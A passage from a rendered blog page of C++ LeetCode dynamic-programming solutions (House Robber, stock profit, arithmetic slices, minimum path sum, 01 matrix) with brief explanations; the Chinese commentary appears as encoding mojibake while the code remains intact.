class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[len<span class="number">-1</span>] = nums[len<span class="number">-1</span>];</span><br><span class="line">        dp[len<span class="number">-2</span>] = <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]);</span><br><span class="line">        dp[len<span class="number">-3</span>] = <span class="built_in">max</span>(nums[len<span class="number">-2</span>], nums[len<span class="number">-3</span>] + dp[len<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = len<span class="number">-4</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            dp[i] = nums[i] + <span class="built_in">max</span>(dp[i+<span class="number">3</span>], dp[i+<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[<span class="number">0</span>], dp[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ç”±äºç¬¬0å®¶å¯ä»¥æ‰“åŠ«ï¼Œä¹Ÿå¯ä»¥è·³è¿‡ï¼Œæ‰€ä»¥æœ€ç»ˆç»“æœæ˜¯ $ max(dp[0], dp[1]) $</p></blockquote><blockquote><p>åŒä¸Šï¼Œä¹Ÿå¯ä»¥ä¼˜åŒ–å­˜å‚¨ç©ºé—´</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[len<span class="number">-1</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> a = nums[len<span class="number">-1</span>],b = <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]), c = <span class="built_in">max</span>(nums[len<span class="number">-2</span>], nums[len<span class="number">-3</span>] + nums[len<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = len<span class="number">-4</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> d = nums[i] + <span class="built_in">max</span>(a, b);</span><br><span class="line">            a = b;b = c;c = d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(b, c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="121-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº"><a href="#121-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº" class="headerlink" title="121. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> minPos = len<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> maxx = prices[len<span class="number">-1</span>];</span><br><span class="line">        <span class="type">int</span> maxx1 = prices[len<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = len<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxx1 = <span class="built_in">max</span>(prices[i], maxx1);</span><br><span class="line">            <span class="keyword">if</span>(maxx1 - prices[i] &gt; maxx - prices[minPos]) &#123;</span><br><span class="line">                minPos = i;</span><br><span class="line">                maxx = maxx1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx - prices[minPos];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è®°maxxæ•°ç»„ä¸­ $ maxx[i] $ è¡¨ç¤º $ max(prices[j]); j &#x3D; i,i+1,â€¦,n-1 $<br>å‡è®¾åœ¨ç¬¬iå¤©ä¹°å…¥ï¼Œåˆ™åº”è¯¥åœ¨ç¬¬iå¤©åå”®ä»·æœ€é«˜çš„ä¸€å¤©å–å‡ºï¼Œä¹Ÿå°±æ˜¯ $ maxx[i] $<br>å†æŠŠmaxxæ•°ç»„ä¼˜åŒ–æ‰ </p></blockquote><h3 id="413-ç­‰å·®æ•°åˆ—åˆ’åˆ†"><a href="#413-ç­‰å·®æ•°åˆ—åˆ’åˆ†" class="headerlink" title="413. ç­‰å·®æ•°åˆ—åˆ’åˆ†"></a><a href="https://leetcode.cn/problems/arithmetic-slices/">413. ç­‰å·®æ•°åˆ—åˆ’åˆ†</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; len &amp;&amp; nums[i] - nums[i<span class="number">-1</span>] == nums[i<span class="number">-1</span>] - nums[i<span class="number">-2</span>]) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">                ans += (count<span class="number">-2</span>)*(count<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &lt; len<span class="number">-1</span>) &#123;</span><br><span class="line">                i += <span class="number">1</span>;</span><br><span class="line">                count = <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ç”±äºæ±‚çš„æ˜¯è¿ç»­å­æ•°ç»„ä¸­ä¸ºç­‰å·®æ•°åˆ—çš„ä¸ªæ•°ï¼Œå¯ä»¥æŠŠnumsçœ‹ä½œå¤šä¸ªå…¬å·®ä¸åŒçš„ç­‰å·®æ•°åˆ—æ‹¼æ¥åœ¨ä¸€èµ·<br>åªéœ€è¦æ‰¾åˆ°æ¯æ®µæœ€é•¿çš„ç­‰å·®æ•°åˆ—ï¼Œè®¡ç®—å®ƒæœ‰å¤šå°‘ä¸ªå­ç­‰å·®æ•°åˆ—<br>ä¹Ÿå°±æ˜¯ $$ \sum_{i&#x3D;3}^n(n+1-i) &#x3D; (n-2) \times (n-1)&#x2F;2 $$ å…¶ä¸­næ˜¯ç­‰å·®æ•°åˆ—çš„é•¿åº¦ã€‚<br>åº”è¯¥æ²¡æœ‰ç”¨dpçš„æ€æƒ³å§ï¼Ÿ</p></blockquote><h4 id="dpç‰ˆ"><a href="#dpç‰ˆ" class="headerlink" title="dpç‰ˆ"></a>dpç‰ˆ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] - nums[i<span class="number">-1</span>] == nums[i<span class="number">-1</span>] - nums[i<span class="number">-2</span>]) &#123;</span><br><span class="line">            dp[i] = dp[i<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">accumulate</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸¾ä¸ªä¾‹å­å¯ä»¥çœ‹å‡º<br>è‹¥nums &#x3D; [1,2,3,4,5,7,9,11]<br>åˆ™dp   &#x3D; [0,0,1,2,3,0,1,2]<br>ä¸€ä¸ªç­‰å·®æ•°åˆ—ä¸­çš„ $ \sum(dp[i]) $ å’Œæˆ‘ä¸Šé¢åˆ†æçš„ $ \sum(n+1-i) $ ä¸€æ ·çš„</p></blockquote><h2 id="åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šäºŒç»´"><a href="#åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šäºŒç»´" class="headerlink" title="åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šäºŒç»´"></a>åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šäºŒç»´</h2><h3 id="64-æœ€å°è·¯å¾„å’Œ"><a href="#64-æœ€å°è·¯å¾„å’Œ" class="headerlink" title="64. æœ€å°è·¯å¾„å’Œ"></a><a href="https://leetcode.cn/problems/minimum-path-sum/">64. æœ€å°è·¯å¾„å’Œ</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            grid[i][<span class="number">0</span>] += grid[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            grid[<span class="number">0</span>][i] += grid[<span class="number">0</span>][i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                grid[i][j] += <span class="built_in">min</span>(grid[i<span class="number">-1</span>][j], grid[i][j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> grid[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ¯”è¾ƒå¥½æƒ³ï¼Œå› ä¸ºåªèƒ½å‘å³æˆ–å‘ä¸‹èµ°ï¼Œé‚£ä¹ˆ</p><ul><li>å¯¹äº $ grid[i][j] (i &gt; 0 , j &gt; 0) $ ï¼Œ åˆ°è¾¾å®ƒçš„æœ€çŸ­è·¯å¾„æ˜¯ $ grid[i][j] + min(grid[i-1][j], grid[i][j-1]) $</li><li>å¯¹äº $ grid[i][j] (i &#x3D; 0 , j &gt; 0) $ ï¼Œ åˆ°è¾¾å®ƒçš„æœ€çŸ­è·¯å¾„æ˜¯ $ grid[i][j] + grid[i][j-1] $</li><li>å¯¹äº $ grid[i][j] (i &gt; 0 , j &#x3D; 0) $ ï¼Œ åˆ°è¾¾å®ƒçš„æœ€çŸ­è·¯å¾„æ˜¯ $ grid[i][j] + grid[i-1][j] $</li></ul></blockquote><h4 id="dpæ•°ç»„å‹ç¼©"><a href="#dpæ•°ç»„å‹ç¼©" class="headerlink" title="dpæ•°ç»„å‹ç¼©"></a>dpæ•°ç»„å‹ç¼©</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i] = grid[<span class="number">0</span>][i] + dp[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>] += grid[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[j] = grid[i][j] + <span class="built_in">min</span>(dp[j], dp[j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ¯æ¬¡åªæ›´æ–°åŒä¸€è¡Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºæ¯æ¬¡åªéœ€è¦å·¦è¾¹çš„å’Œä¸Šä¸€è¡Œçš„ï¼Œå…¶ä»–çš„ä¸éœ€è¦</p></blockquote><h3 id="542-01-çŸ©é˜µ"><a href="#542-01-çŸ©é˜µ" class="headerlink" title="542. 01 çŸ©é˜µ"></a><a href="https://leetcode.cn/problems/01-matrix/">542. 01 çŸ©é˜µ</a></h3><h4 id="æœªacä»£ç "><a href="#æœªacä»£ç " class="headerlink" title="æœªacä»£ç "></a>æœªacä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mat) &#123;</span><br><span class="line">        <span class="type">int</span> m = mat.<span class="built_in">size</span>(), n = mat[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ans</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">20000</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(i<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i<span class="number">-1</span>][j]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i][j<span class="number">-1</span>]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i+<span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i+<span class="number">1</span>][j]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j+<span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    ans[i][j] = <span class="built_in">min</span>(ans[i][j+<span class="number">1</span>]+<span class="number">1</span>, ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(i<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i<span class="number">-1</span>][j] = <span class="built_in">min</span>(ans[i<span class="number">-1</span>][j], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j<span class="number">-1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    ans[i][j<span class="number">-1</span>] = <span class="built_in">min</span>(ans[i][j<span class="number">-1</span>], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i+<span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    ans[i+<span class="number">1</span>][j] = <span class="built_in">min</span>(ans[i+<span class="number">1</span>][j], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j+<span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    ans[i][j+<span class="number">1</span>] = <span class="built_in">min</span>(ans[i][j+<span class="number">1</span>], <span class="number">1</span> + ans[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªçš„æƒ³æ³•å’Œç­”æ¡ˆå·²ç»å¾ˆæ¥è¿‘äº†ï¼Œä½†æˆ‘åªä»ä¸€ä¸ªæ–¹å‘ä¸Šè¿›è¡Œäº†æ›´æ–°ï¼Œåº”è¯¥ä»å››ä¸ªè§’å¼€å§‹åˆ†åˆ«è¿›è¡Œæ›´æ–°ä¸€æ¬¡</p></blockquote><h4 id="acä»£ç "><a href="#acä»£ç " class="headerlink" title="acä»£ç "></a>acä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>(), n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dist</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i + <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j + <span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span> &lt; m) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i + <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j + <span class="number">1</span> &lt; n) &#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        